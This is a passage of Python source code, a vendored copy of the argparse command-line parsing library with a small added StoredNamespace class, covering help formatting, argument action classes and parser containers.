__FILENAME__ = argparse
# Author: Steven J. Bethard <steven.bethard@gmail.com>.
from moduleexception import ModuleException
from ast import literal_eval


"""Command-line parsing library

This module is an optparse-inspired command-line parsing library that:

    - handles both optional and positional arguments
    - produces highly informative usage messages
    - supports parsers that dispatch to sub-parsers

The following is a simple usage example that sums integers from the
command-line and writes the result to a file::

    parser = argparse.ArgumentParser(
        description='sum the integers at the command line')
    parser.add_argument(
        'integers', metavar='int', nargs='+', type=int,
        help='an integer to be summed')
    parser.add_argument(
        '--log', default=sys.stdout, type=argparse.FileType('w'),
        help='the file where the sum should be written')
    args = parser.parse_args()
    args.log.write('%s' % sum(args.integers))
    args.log.close()

The module contains the following public classes:

    - ArgumentParser -- The main entry point for command-line parsing. As the
        example above shows, the add_argument() method is used to populate
        the parser with actions for optional and positional arguments. Then
        the parse_args() method is invoked to convert the args at the
        command-line into an object with attributes.

    - ArgumentError -- The exception raised by ArgumentParser objects when
        there are errors with the parser's actions. Errors raised while
        parsing the command-line are caught by ArgumentParser and emitted
        as command-line messages.

    - FileType -- A factory for defining types of files to be created. As the
        example above shows, instances of FileType are typically passed as
        the type= argument of add_argument() calls.

    - Action -- The base class for parser actions. Typically actions are
        selected by passing strings like 'store_true' or 'append_const' to
        the action= argument of add_argument(). However, for greater
        customization of ArgumentParser actions, subclasses of Action may
        be defined and passed as the action= argument.

    - HelpFormatter, RawDescriptionHelpFormatter, RawTextHelpFormatter,
        ArgumentDefaultsHelpFormatter -- Formatter classes which
        may be passed as the formatter_class= argument to the
        ArgumentParser constructor. HelpFormatter is the default,
        RawDescriptionHelpFormatter and RawTextHelpFormatter tell the parser
        not to change the formatting for help text, and
        ArgumentDefaultsHelpFormatter adds information about argument defaults
        to the help.

All other classes in this module are considered implementation details.
(Also note that HelpFormatter and RawDescriptionHelpFormatter are only
considered public as object names -- the API of the formatter objects is
still considered an implementation detail.)
"""

__version__ = '1.2.1'
__all__ = [
    'ArgumentParser',
    'ArgumentError',
    'ArgumentTypeError',
    'FileType',
    'HelpFormatter',
    'ArgumentDefaultsHelpFormatter',
    'RawDescriptionHelpFormatter',
    'RawTextHelpFormatter',
    'Namespace',
    'Action',
    'ONE_OR_MORE',
    'OPTIONAL',
    'PARSER',
    'REMAINDER',
    'SUPPRESS',
    'ZERO_OR_MORE',
]


import copy as _copy
import os as _os
import re as _re
import sys as _sys
import textwrap as _textwrap

from gettext import gettext as _

try:
    set
except NameError:
    # for python < 2.4 compatibility (sets module is there since 2.3):
    from sets import Set as set

try:
    basestring
except NameError:
    basestring = str

try:
    sorted
except NameError:
    # for python < 2.4 compatibility:
    def sorted(iterable, reverse=False):
        result = list(iterable)
        result.sort()
        if reverse:
            result.reverse()
        return result


def _callable(obj):
    return hasattr(obj, '__call__') or hasattr(obj, '__bases__')


SUPPRESS = '==SUPPRESS=='

OPTIONAL = '?'
ZERO_OR_MORE = '*'
ONE_OR_MORE = '+'
PARSER = 'A...'
REMAINDER = '...'
_UNRECOGNIZED_ARGS_ATTR = '_unrecognized_args'

# =============================
# Utility functions and classes
# =============================

class _AttributeHolder(object):
    """Abstract base class that provides __repr__.

    The __repr__ method returns a string in the format::
        ClassName(attr=name, attr=name, ...)
    The attributes are determined either by a class-level attribute,
    '_kwarg_names', or by inspecting the instance __dict__.
    """

    def __repr__(self):
        type_name = type(self).__name__
        arg_strings = []
        for arg in self._get_args():
            arg_strings.append(repr(arg))
        for name, value in self._get_kwargs():
            arg_strings.append('%s=%r' % (name, value))
        return '%s(%s)' % (type_name, ', '.join(arg_strings))

    def _get_kwargs(self):
        return sorted(self.__dict__.items())

    def _get_args(self):
        return []


def _ensure_value(namespace, name, value):
    if getattr(namespace, name, None) is None:
        setattr(namespace, name, value)
    return getattr(namespace, name)


# ===============
# Formatting Help
# ===============

class HelpFormatter(object):
    """Formatter for generating usage messages and argument help strings.

    Only the name of this class is considered a public API. All the methods
    provided by the class are considered an implementation detail.
    """

    def __init__(self,
                 prog,
                 indent_increment=2,
                 max_help_position=24,
                 width=None):

        # default setting for width
        if width is None:
            try:
                width = int(_os.environ['COLUMNS'])
            except (KeyError, ValueError):
                width = 80
            width -= 2

        self._prog = prog
        self._indent_increment = indent_increment
        self._max_help_position = max_help_position
        self._width = width

        self._current_indent = 0
        self._level = 0
        self._action_max_length = 0

        self._root_section = self._Section(self, None)
        self._current_section = self._root_section

        self._whitespace_matcher = _re.compile(r'\s+')
        self._long_break_matcher = _re.compile(r'\n\n\n+')

    # ===============================
    # Section and indentation methods
    # ===============================
    def _indent(self):
        self._current_indent += self._indent_increment
        self._level += 1

    def _dedent(self):
        self._current_indent -= self._indent_increment
        assert self._current_indent >= 0, 'Indent decreased below 0.'
        self._level -= 1

    class _Section(object):

        def __init__(self, formatter, parent, heading=None):
            self.formatter = formatter
            self.parent = parent
            self.heading = heading
            self.items = []

        def format_help(self):
            # format the indented section
            if self.parent is not None:
                self.formatter._indent()
            join = self.formatter._join_parts
            for func, args in self.items:
                func(*args)
            item_help = join([func(*args) for func, args in self.items])
            if self.parent is not None:
                self.formatter._dedent()

            # return nothing if the section was empty
            if not item_help:
                return ''

            # add the heading if the section was non-empty
            if self.heading is not SUPPRESS and self.heading is not None:
                current_indent = self.formatter._current_indent
                heading = '%*s%s:\n' % (current_indent, '', self.heading)
            else:
                heading = ''

            # join the section-initial newline, the heading and the help
            return join(['\n', heading, item_help, '\n'])

    def _add_item(self, func, args):
        self._current_section.items.append((func, args))

    # ========================
    # Message building methods
    # ========================
    def start_section(self, heading):
        self._indent()
        section = self._Section(self, self._current_section, heading)
        self._add_item(section.format_help, [])
        self._current_section = section

    def end_section(self):
        self._current_section = self._current_section.parent
        self._dedent()

    def add_text(self, text):
        if text is not SUPPRESS and text is not None:
            self._add_item(self._format_text, [text])

    def add_usage(self, usage, actions, groups, prefix=None):
        if usage is not SUPPRESS:
            args = usage, actions, groups, prefix
            self._add_item(self._format_usage, args)

    def add_argument(self, action):
        if action.help is not SUPPRESS:

            # find all invocations
            get_invocation = self._format_action_invocation
            invocations = [get_invocation(action)]
            for subaction in self._iter_indented_subactions(action):
                invocations.append(get_invocation(subaction))

            # update the maximum item length
            invocation_length = max([len(s) for s in invocations])
            action_length = invocation_length + self._current_indent
            self._action_max_length = max(self._action_max_length,
                                          action_length)

            # add the item to the list
            self._add_item(self._format_action, [action])

    def add_arguments(self, actions):
        for action in actions:
            self.add_argument(action)

    # =======================
    # Help-formatting methods
    # =======================
    def format_help(self):
        help = self._root_section.format_help()
        if help:
            help = self._long_break_matcher.sub('\n\n', help)
            help = help.strip('\n') + '\n'
        return help

    def _join_parts(self, part_strings):
        return ''.join([part
                        for part in part_strings
                        if part and part is not SUPPRESS])

    def _format_usage(self, usage, actions, groups, prefix):
        if prefix is None:
            prefix = _('usage: ')

        # if usage is specified, use that
        if usage is not None:
            usage = usage % dict(prog=self._prog)

        # if no optionals or positionals are available, usage is just prog
        elif usage is None and not actions:
            usage = '%(prog)s' % dict(prog=self._prog)

        # if optionals and positionals are available, calculate usage
        elif usage is None:
            prog = '%(prog)s' % dict(prog=self._prog)

            # split optionals from positionals
            optionals = []
            positionals = []
            for action in actions:
                if action.option_strings:
                    optionals.append(action)
                else:
                    positionals.append(action)

            # build full usage string
            format = self._format_actions_usage
            action_usage = format(optionals + positionals, groups)
            usage = ' '.join([s for s in [prog, action_usage] if s])

            # wrap the usage parts if it's too long
            text_width = self._width - self._current_indent
            if len(prefix) + len(usage) > text_width:

                # break usage into wrappable parts
                part_regexp = r'\(.*?\)+|\[.*?\]+|\S+'
                opt_usage = format(optionals, groups)
                pos_usage = format(positionals, groups)
                opt_parts = _re.findall(part_regexp, opt_usage)
                pos_parts = _re.findall(part_regexp, pos_usage)
                assert ' '.join(opt_parts) == opt_usage
                assert ' '.join(pos_parts) == pos_usage

                # helper for wrapping lines
                def get_lines(parts, indent, prefix=None):
                    lines = []
                    line = []
                    if prefix is not None:
                        line_len = len(prefix) - 1
                    else:
                        line_len = len(indent) - 1
                    for part in parts:
                        if line_len + 1 + len(part) > text_width:
                            lines.append(indent + ' '.join(line))
                            line = []
                            line_len = len(indent) - 1
                        line.append(part)
                        line_len += len(part) + 1
                    if line:
                        lines.append(indent + ' '.join(line))
                    if prefix is not None:
                        lines[0] = lines[0][len(indent):]
                    return lines

                # if prog is short, follow it with optionals or positionals
                if len(prefix) + len(prog) <= 0.75 * text_width:
                    indent = ' ' * (len(prefix) + len(prog) + 1)
                    if opt_parts:
                        lines = get_lines([prog] + opt_parts, indent, prefix)
                        lines.extend(get_lines(pos_parts, indent))
                    elif pos_parts:
                        lines = get_lines([prog] + pos_parts, indent, prefix)
                    else:
                        lines = [prog]

                # if prog is long, put it on its own line
                else:
                    indent = ' ' * len(prefix)
                    parts = opt_parts + pos_parts
                    lines = get_lines(parts, indent)
                    if len(lines) > 1:
                        lines = []
                        lines.extend(get_lines(opt_parts, indent))
                        lines.extend(get_lines(pos_parts, indent))
                    lines = [prog] + lines

                # join lines into usage
                usage = '\n'.join(lines)

        # prefix with 'usage:'
        return '%s%s\n\n' % (prefix, usage)

    def _format_actions_usage(self, actions, groups):
        # find group indices and identify actions in groups
        group_actions = set()
        inserts = {}
        for group in groups:
            try:
                start = actions.index(group._group_actions[0])
            except ValueError:
                continue
            else:
                end = start + len(group._group_actions)
                if actions[start:end] == group._group_actions:
                    for action in group._group_actions:
                        group_actions.add(action)
                    if not group.required:
                        if start in inserts:
                            inserts[start] += ' ['
                        else:
                            inserts[start] = '['
                        inserts[end] = ']'
                    else:
                        if start in inserts:
                            inserts[start] += ' ('
                        else:
                            inserts[start] = '('
                        inserts[end] = ')'
                    for i in range(start + 1, end):
                        inserts[i] = '|'

        # collect all actions format strings
        parts = []
        for i, action in enumerate(actions):

            # suppressed arguments are marked with None
            # remove | separators for suppressed arguments
            if action.help is SUPPRESS:
                parts.append(None)
                if inserts.get(i) == '|':
                    inserts.pop(i)
                elif inserts.get(i + 1) == '|':
                    inserts.pop(i + 1)

            # produce all arg strings
            elif not action.option_strings:
                part = self._format_args(action, action.dest)

                # if it's in a group, strip the outer []
                if action in group_actions:
                    if part[0] == '[' and part[-1] == ']':
                        part = part[1:-1]

                # add the action string to the list
                parts.append(part)

            # produce the first way to invoke the option in brackets
            else:
                option_string = action.option_strings[0]

                # if the Optional doesn't take a value, format is:
                #    -s or --long
                if action.nargs == 0:
                    part = '%s' % option_string

                # if the Optional takes a value, format is:
                #    -s ARGS or --long ARGS
                else:
                    default = action.dest.upper()
                    args_string = self._format_args(action, default)
                    part = '%s %s' % (option_string, args_string)

                # make it look optional if it's not required or in a group
                if not action.required and action not in group_actions:
                    part = '[%s]' % part

                # add the action string to the list
                parts.append(part)

        # insert things at the necessary indices
        for i in sorted(inserts, reverse=True):
            parts[i:i] = [inserts[i]]

        # join all the action items with spaces
        text = ' '.join([item for item in parts if item is not None])

        # clean up separators for mutually exclusive groups
        open = r'[\[(]'
        close = r'[\])]'
        text = _re.sub(r'(%s) ' % open, r'\1', text)
        text = _re.sub(r' (%s)' % close, r'\1', text)
        text = _re.sub(r'%s *%s' % (open, close), r'', text)
        text = _re.sub(r'\(([^|]*)\)', r'\1', text)
        text = text.strip()

        # return the text
        return text

    def _format_text(self, text):
        if '%(prog)' in text:
            text = text % dict(prog=self._prog)
        text_width = self._width - self._current_indent
        indent = ' ' * self._current_indent
        return self._fill_text(text, text_width, indent) + '\n\n'

    def _format_action(self, action):
        # determine the required width and the entry label
        help_position = min(self._action_max_length + 2,
                            self._max_help_position)
        help_width = self._width - help_position
        action_width = help_position - self._current_indent - 2
        action_header = self._format_action_invocation(action)

        # ho nelp; start on same line and add a final newline
        if not action.help:
            tup = self._current_indent, '', action_header
            action_header = '%*s%s\n' % tup

        # short action name; start on the same line and pad two spaces
        elif len(action_header) <= action_width:
            tup = self._current_indent, '', action_width, action_header
            action_header = '%*s%-*s  ' % tup
            indent_first = 0

        # long action name; start on the next line
        else:
            tup = self._current_indent, '', action_header
            action_header = '%*s%s\n' % tup
            indent_first = help_position

        # collect the pieces of the action help
        parts = [action_header]

        # if there was help for the action, add lines of help text
        if action.help:
            help_text = self._expand_help(action)
            help_lines = self._split_lines(help_text, help_width)
            parts.append('%*s%s\n' % (indent_first, '', help_lines[0]))
            for line in help_lines[1:]:
                parts.append('%*s%s\n' % (help_position, '', line))

        # or add a newline if the description doesn't end with one
        elif not action_header.endswith('\n'):
            parts.append('\n')

        # if there are any sub-actions, add their help as well
        for subaction in self._iter_indented_subactions(action):
            parts.append(self._format_action(subaction))

        # return a single string
        return self._join_parts(parts)

    def _format_action_invocation(self, action):
        if not action.option_strings:
            metavar, = self._metavar_formatter(action, action.dest)(1)
            return metavar

        else:
            parts = []

            # if the Optional doesn't take a value, format is:
            #    -s, --long
            if action.nargs == 0:
                parts.extend(action.option_strings)

            # if the Optional takes a value, format is:
            #    -s ARGS, --long ARGS
            else:
                default = action.dest.upper()
                args_string = self._format_args(action, default)
                for option_string in action.option_strings:
                    parts.append('%s %s' % (option_string, args_string))

            return ', '.join(parts)

    def _metavar_formatter(self, action, default_metavar):
        if action.metavar is not None:
            result = action.metavar
        elif action.choices is not None:
            choice_strs = [str(choice) for choice in action.choices]
            result = '{%s}' % ','.join(choice_strs)
        else:
            result = default_metavar

        def format(tuple_size):
            if isinstance(result, tuple):
                return result
            else:
                return (result, ) * tuple_size
        return format

    def _format_args(self, action, default_metavar):
        get_metavar = self._metavar_formatter(action, default_metavar)
        if action.nargs is None:
            result = '%s' % get_metavar(1)
        elif action.nargs == OPTIONAL:
            result = '[%s]' % get_metavar(1)
        elif action.nargs == ZERO_OR_MORE:
            result = '[%s [%s ...]]' % get_metavar(2)
        elif action.nargs == ONE_OR_MORE:
            result = '%s [%s ...]' % get_metavar(2)
        elif action.nargs == REMAINDER:
            result = '...'
        elif action.nargs == PARSER:
            result = '%s ...' % get_metavar(1)
        else:
            formats = ['%s' for _ in range(action.nargs)]
            result = ' '.join(formats) % get_metavar(action.nargs)
        return result

    def _expand_help(self, action):
        params = dict(vars(action), prog=self._prog)
        for name in list(params):
            if params[name] is SUPPRESS:
                del params[name]
        for name in list(params):
            if hasattr(params[name], '__name__'):
                params[name] = params[name].__name__
        if params.get('choices') is not None:
            choices_str = ', '.join([str(c) for c in params['choices']])
            params['choices'] = choices_str
        return self._get_help_string(action) % params

    def _iter_indented_subactions(self, action):
        try:
            get_subactions = action._get_subactions
        except AttributeError:
            pass
        else:
            self._indent()
            for subaction in get_subactions():
                yield subaction
            self._dedent()

    def _split_lines(self, text, width):
        text = self._whitespace_matcher.sub(' ', text).strip()
        return _textwrap.wrap(text, width)

    def _fill_text(self, text, width, indent):
        text = self._whitespace_matcher.sub(' ', text).strip()
        return _textwrap.fill(text, width, initial_indent=indent,
                                           subsequent_indent=indent)

    def _get_help_string(self, action):
        return action.help


class RawDescriptionHelpFormatter(HelpFormatter):
    """Help message formatter which retains any formatting in descriptions.

    Only the name of this class is considered a public API. All the methods
    provided by the class are considered an implementation detail.
    """

    def _fill_text(self, text, width, indent):
        return ''.join([indent + line for line in text.splitlines(True)])


class RawTextHelpFormatter(RawDescriptionHelpFormatter):
    """Help message formatter which retains formatting of all help text.

    Only the name of this class is considered a public API. All the methods
    provided by the class are considered an implementation detail.
    """

    def _split_lines(self, text, width):
        return text.splitlines()


class ArgumentDefaultsHelpFormatter(HelpFormatter):
    """Help message formatter which adds default values to argument help.

    Only the name of this class is considered a public API. All the methods
    provided by the class are considered an implementation detail.
    """

    def _get_help_string(self, action):
        help = action.help
        if '%(default)' not in action.help:
            if action.default is not SUPPRESS:
                defaulting_nargs = [OPTIONAL, ZERO_OR_MORE]
                if action.option_strings or action.nargs in defaulting_nargs:
                    help += ' (default: %(default)s)'
        return help


# =====================
# Options and Arguments
# =====================

def _get_action_name(argument):
    if argument is None:
        return None
    elif argument.option_strings:
        return  '/'.join(argument.option_strings)
    elif argument.metavar not in (None, SUPPRESS):
        return argument.metavar
    elif argument.dest not in (None, SUPPRESS):
        return argument.dest
    else:
        return None


class ArgumentError(Exception):
    """An error from creating or using an argument (optional or positional).

    The string value of this exception is the message, augmented with
    information about the argument that caused it.
    """

    def __init__(self, argument, message):
        self.argument_name = _get_action_name(argument)
        self.message = message

    def __str__(self):
        if self.argument_name is None:
            format = '%(message)s'
        else:
            format = 'argument %(argument_name)s: %(message)s'
        return format % dict(message=self.message,
                             argument_name=self.argument_name)


class ArgumentTypeError(Exception):
    """An error from trying to convert a command line string to a type."""
    pass


# ==============
# Action classes
# ==============

class Action(_AttributeHolder):
    """Information about how to convert command line strings to Python objects.

    Action objects are used by an ArgumentParser to represent the information
    needed to parse a single argument from one or more strings from the
    command line. The keyword arguments to the Action constructor are also
    all attributes of Action instances.

    Keyword Arguments:

        - option_strings -- A list of command-line option strings which
            should be associated with this action.

        - dest -- The name of the attribute to hold the created object(s)

        - nargs -- The number of command-line arguments that should be
            consumed. By default, one argument will be consumed and a single
            value will be produced.  Other values include:
                - N (an integer) consumes N arguments (and produces a list)
                - '?' consumes zero or one arguments
                - '*' consumes zero or more arguments (and produces a list)
                - '+' consumes one or more arguments (and produces a list)
            Note that the difference between the default and nargs=1 is that
            with the default, a single value will be produced, while with
            nargs=1, a list containing a single value will be produced.

        - const -- The value to be produced if the option is specified and the
            option uses an action that takes no values.

        - default -- The value to be produced if the option is not specified.

        - type -- The type which the command-line arguments should be converted
            to, should be one of 'string', 'int', 'float', 'complex' or a
            callable object that accepts a single string argument. If None,
            'string' is assumed.

        - choices -- A container of values that should be allowed. If not None,
            after a command-line argument has been converted to the appropriate
            type, an exception will be raised if it is not a member of this
            collection.

        - required -- True if the action must always be specified at the
            command line. This is only meaningful for optional command-line
            arguments.

        - help -- The help string describing the argument.

        - metavar -- The name to be used for the option's argument with the
            help string. If None, the 'dest' value will be used as the name.
    """

    def __init__(self,
                 option_strings,
                 dest,
                 nargs=None,
                 const=None,
                 default=None,
                 type=None,
                 choices=None,
                 required=False,
                 help=None,
                 metavar=None):
        self.option_strings = option_strings
        self.dest = dest
        self.nargs = nargs
        self.const = const
        self.default = default
        self.type = type
        self.choices = choices
        self.required = required
        self.help = help
        self.metavar = metavar

    def _get_kwargs(self):
        names = [
            'option_strings',
            'dest',
            'nargs',
            'const',
            'default',
            'type',
            'choices',
            'help',
            'metavar',
        ]
        return [(name, getattr(self, name)) for name in names]

    def __call__(self, parser, namespace, values, option_string=None):
        raise NotImplementedError(_('.__call__() not defined'))


class _StoreAction(Action):

    def __init__(self,
                 option_strings,
                 dest,
                 nargs=None,
                 const=None,
                 default=None,
                 type=None,
                 choices=None,
                 required=False,
                 help=None,
                 metavar=None):
        if nargs == 0:
            raise ValueError('nargs for store actions must be > 0; if you '
                             'have nothing to store, actions such as store '
                             'true or store const may be more appropriate')
        if const is not None and nargs != OPTIONAL:
            raise ValueError('nargs must be %r to supply const' % OPTIONAL)
        super(_StoreAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            nargs=nargs,
            const=const,
            default=default,
            type=type,
            choices=choices,
            required=required,
            help=help,
            metavar=metavar)

    def __call__(self, parser, namespace, values, option_string=None):
        setattr(namespace, self.dest, values)


class _StoreConstAction(Action):

    def __init__(self,
                 option_strings,
                 dest,
                 const,
                 default=None,
                 required=False,
                 help=None,
                 type=None,
                 metavar=None):
        super(_StoreConstAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            nargs=0,
            const=const,
            default=default,
            required=required,
            help=help)

    def __call__(self, parser, namespace, values, option_string=None):
        setattr(namespace, self.dest, self.const)


class _StoreTrueAction(_StoreConstAction):

    def __init__(self,
                 option_strings,
                 dest,
                 default=False,
                 required=False,
                 help=None):
        super(_StoreTrueAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            const=True,
            default=default,
            required=required,
            help=help)


class _StoreFalseAction(_StoreConstAction):

    def __init__(self,
                 option_strings,
                 dest,
                 default=True,
                 required=False,
                 help=None):
        super(_StoreFalseAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            const=False,
            default=default,
            required=required,
            help=help)


class _AppendAction(Action):

    def __init__(self,
                 option_strings,
                 dest,
                 nargs=None,
                 const=None,
                 default=None,
                 type=None,
                 choices=None,
                 required=False,
                 help=None,
                 metavar=None):
        if nargs == 0:
            raise ValueError('nargs for append actions must be > 0; if arg '
                             'strings are not supplying the value to append, '
                             'the append const action may be more appropriate')
        if const is not None and nargs != OPTIONAL:
            raise ValueError('nargs must be %r to supply const' % OPTIONAL)
        super(_AppendAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            nargs=nargs,
            const=const,
            default=default,
            type=type,
            choices=choices,
            required=required,
            help=help,
            metavar=metavar)

    def __call__(self, parser, namespace, values, option_string=None):
        items = _copy.copy(_ensure_value(namespace, self.dest, []))
        items.append(values)
        setattr(namespace, self.dest, items)


class _AppendConstAction(Action):

    def __init__(self,
                 option_strings,
                 dest,
                 const,
                 default=None,
                 required=False,
                 help=None,
                 metavar=None):
        super(_AppendConstAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            nargs=0,
            const=const,
            default=default,
            required=required,
            help=help,
            metavar=metavar)

    def __call__(self, parser, namespace, values, option_string=None):
        items = _copy.copy(_ensure_value(namespace, self.dest, []))
        items.append(self.const)
        setattr(namespace, self.dest, items)


class _CountAction(Action):

    def __init__(self,
                 option_strings,
                 dest,
                 default=None,
                 required=False,
                 help=None):
        super(_CountAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            nargs=0,
            default=default,
            required=required,
            help=help)

    def __call__(self, parser, namespace, values, option_string=None):
        new_count = _ensure_value(namespace, self.dest, 0) + 1
        setattr(namespace, self.dest, new_count)


class _HelpAction(Action):

    def __init__(self,
                 option_strings,
                 dest=SUPPRESS,
                 default=SUPPRESS,
                 help=None):
        super(_HelpAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            default=default,
            nargs=0,
            help=help)

    def __call__(self, parser, namespace, values, option_string=None):
        parser.print_help()
        parser.exit()


class _VersionAction(Action):

    def __init__(self,
                 option_strings,
                 version=None,
                 dest=SUPPRESS,
                 default=SUPPRESS,
                 help="show program's version number and exit"):
        super(_VersionAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            default=default,
            nargs=0,
            help=help)
        self.version = version

    def __call__(self, parser, namespace, values, option_string=None):
        version = self.version
        if version is None:
            version = parser.version
        formatter = parser._get_formatter()
        formatter.add_text(version)
        parser.exit(message=formatter.format_help())


class _SubParsersAction(Action):

    class _ChoicesPseudoAction(Action):

        def __init__(self, name, help):
            sup = super(_SubParsersAction._ChoicesPseudoAction, self)
            sup.__init__(option_strings=[], dest=name, help=help)

    def __init__(self,
                 option_strings,
                 prog,
                 parser_class,
                 dest=SUPPRESS,
                 help=None,
                 metavar=None):

        self._prog_prefix = prog
        self._parser_class = parser_class
        self._name_parser_map = {}
        self._choices_actions = []

        super(_SubParsersAction, self).__init__(
            option_strings=option_strings,
            dest=dest,
            nargs=PARSER,
            choices=self._name_parser_map,
            help=help,
            metavar=metavar)

    def add_parser(self, name, **kwargs):
        # set prog from the existing prefix
        if kwargs.get('prog') is None:
            kwargs['prog'] = '%s %s' % (self._prog_prefix, name)

        # create a pseudo-action to hold the choice help
        if 'help' in kwargs:
            help = kwargs.pop('help')
            choice_action = self._ChoicesPseudoAction(name, help)
            self._choices_actions.append(choice_action)

        # create the parser and add it to the map
        parser = self._parser_class(**kwargs)
        self._name_parser_map[name] = parser
        return parser

    def _get_subactions(self):
        return self._choices_actions

    def __call__(self, parser, namespace, values, option_string=None):
        parser_name = values[0]
        arg_strings = values[1:]

        # set the parser name if requested
        if self.dest is not SUPPRESS:
            setattr(namespace, self.dest, parser_name)

        # select the parser
        try:
            parser = self._name_parser_map[parser_name]
        except KeyError:
            tup = parser_name, ', '.join(self._name_parser_map)
            msg = _('unknown parser %r (choices: %s)' % tup)
            raise ArgumentError(self, msg)

        # parse all the remaining options into the namespace
        # store any unrecognized options on the object, so that the top
        # level parser can decide what to do with them
        namespace, arg_strings = parser.parse_known_args(arg_strings, namespace)
        if arg_strings:
            vars(namespace).setdefault(_UNRECOGNIZED_ARGS_ATTR, [])
            getattr(namespace, _UNRECOGNIZED_ARGS_ATTR).extend(arg_strings)


# ==============
# Type classes
# ==============

class FileType(object):
    """Factory for creating file object types

    Instances of FileType are typically passed as type= arguments to the
    ArgumentParser add_argument() method.

    Keyword Arguments:
        - mode -- A string indicating how the file is to be opened. Accepts the
            same values as the builtin open() function.
        - bufsize -- The file's desired buffer size. Accepts the same values as
            the builtin open() function.
    """

    def __init__(self, mode='r', bufsize=None):
        self._mode = mode
        self._bufsize = bufsize

    def __call__(self, string):
        # the special argument "-" means sys.std{in,out}
        if string == '-':
            if 'r' in self._mode:
                return _sys.stdin
            elif 'w' in self._mode:
                return _sys.stdout
            else:
                msg = _('argument "-" with mode %r' % self._mode)
                raise ValueError(msg)

        # all other arguments are used as file names
        if self._bufsize:
            return open(string, self._mode, self._bufsize)
        else:
            return open(string, self._mode)

    def __repr__(self):
        args = [self._mode, self._bufsize]
        args_str = ', '.join([repr(arg) for arg in args if arg is not None])
        return '%s(%s)' % (type(self).__name__, args_str)

# ===========================
# Optional and Positional Parsing
# ===========================

class Namespace(_AttributeHolder):
    """Simple object for storing attributes.

    Implements equality by attribute names and values, and provides a simple
    string representation.
    """

    def __init__(self, **kwargs):
        for name in kwargs:
            setattr(self, name, kwargs[name])

    __hash__ = None

    def __eq__(self, other):
        return vars(self) == vars(other)

    def __ne__(self, other):
        return not (self == other)

    def __contains__(self, key):
        return key in self.__dict__



class StoredNamespace(Namespace):
    
    stored = True
    
    def __getitem__(self, key):
        return getattr(self, key)
    
    def __setitem__(self,key, value):
        return setattr(self, key, value)
    
    def __len__(self):
        return len(self.__dict__)
    
    def __delitem__(self, key):
        delattr(self, key)

    def __iter__(self):
        for x in self.__dict__:
            yield x, self.__dict__[x]

    def update(self, arguments):
        for arg, value in arguments.items():
            setattr(self, arg, value)

class _ActionsContainer(object):

    def __init__(self,
                 description,
                 prefix_chars,
                 argument_default,
                 conflict_handler):
        super(_ActionsContainer, self).__init__()

        self.description = description
        self.argument_default = argument_default
        self.prefix_chars = prefix_chars
        self.conflict_handler = conflict_handler

        # set up registries
        self._registries = {}

        # register actions
        self.register('action', None, _StoreAction)
        self.register('action', 'store', _StoreAction)
        self.register('action', 'store_const', _StoreConstAction)
        self.register('action', 'store_true', _StoreTrueAction)
        self.register('action', 'store_false', _StoreFalseAction)
        self.register('action', 'append', _AppendAction)
        self.register('action', 'append_const', _AppendConstAction)
        self.register('action', 'count', _CountAction)
        self.register('action', 'help', _HelpAction)
        self.register('action', 'version', _VersionAction)
        self.register('action', 'parsers', _SubParsersAction)

        # raise an exception if the conflict handler is invalid
        self._get_handler()

        # action storage
        self._actions = []
        self._option_string_actions = {}

        # groups
        self._action_groups = []
        self._mutually_exclusive_groups = []

        # defaults storage
        self._defaults = {}

        # determines whether an "option" looks like a negative number
        self._negative_number_matcher = _re.compile(r'^-\d+$|^-\d*\.\d+$')

        # whether or not there are any optionals that look like negative
        # numbers -- uses a list so it can be shared and edited
        self._has_negative_number_optionals = []

    # ====================
    # Registration methods
    # ====================
    def register(self, registry_name, value, object):
        registry = self._registries.setdefault(registry_name, {})
        registry[value] = object

    def _registry_get(self, registry_name, value, default=None):
        return self._registries[registry_name].get(value, default)

    # ==================================
    # Namespace default accessor methods
    # ==================================
    def set_defaults(self, **kwargs):
        self._defaults.update(kwargs)

        # if these defaults match any existing arguments, replace
        # the previous default on the object with the new one
        for action in self._actions:
            if action.dest in kwargs:
                action.default = kwargs[action.dest]

    def get_default(self, dest):
        for action in self._actions:
            if action.dest == dest and action.default is not None:
                return action.default
        return self._defaults.get(dest, None)


    # =======================
    # Adding argument actions
    # =======================
    def add_argument(self, *args, **kwargs):
        """
        add_argument(dest, ..., name=value, ...)
        add_argument(option_string, option_string, ..., name=value, ...)
        """

        # if no positional args are supplied or only one is supplied and
        # it doesn't look like an option string, parse a positional
        # argument
        chars = self.prefix_chars
        if not args or len(args) == 1 and args[0][0] not in chars:
            if args and 'dest' in kwargs:
                raise ValueError('dest supplied twice for positional argument')
            kwargs = self._get_positional_kwargs(*args, **kwargs)

        # otherwise, we're adding an optional argument
        else:
            kwargs = self._get_optional_kwargs(*args, **kwargs)

        # if no default was supplied, use the parser-level default
        if 'default' not in kwargs:
            dest = kwargs['dest']
            if dest in self._defaults:
                kwargs['default'] = self._defaults[dest]
            elif self.argument_default is not None:
                kwargs['default'] = self.argument_default

        # create the action object, and add it to the parser
        action_class = self._pop_action_class(kwargs)
        if not _callable(action_class):
            raise ValueError('unknown action "%s"' % action_class)
        action = action_class(**kwargs)

        # raise an error if the action type is not callable
        type_func = self._registry_get('type', action.type, action.type)
        if not _callable(type_func):
            raise ValueError('%r is not callable' % type_func)

        return self._add_action(action)

    def add_argument_group(self, *args, **kwargs):
        group = _ArgumentGroup(self, *args, **kwargs)
        self._action_groups.append(group)
        return group

    def add_mutually_exclusive_group(self, **kwargs):
        group = _MutuallyExclusiveGroup(self, **kwargs)
        self._mutually_exclusive_groups.append(group)
        return group

    def _add_action(self, action):
        # resolve any conflicts
        self._check_conflict(action)

        # add to actions list
        self._actions.append(action)
        action.container = self

        # index the action by any option strings it has
        for option_string in action.option_strings:
            self._option_string_actions[option_string] = action

        # set the flag if any option strings look like negative numbers
        for option_string in action.option_strings:
            if self._negative_number_matcher.match(option_string):
                if not self._has_negative_number_optionals:
                    self._has_negative_number_optionals.append(True)

        # return the created action
        return action

    def _remove_action(self, action):
        self._actions.remove(action)

    def _add_container_actions(self, container):
        # collect groups by titles
        title_group_map = {}
        for group in self._action_groups:
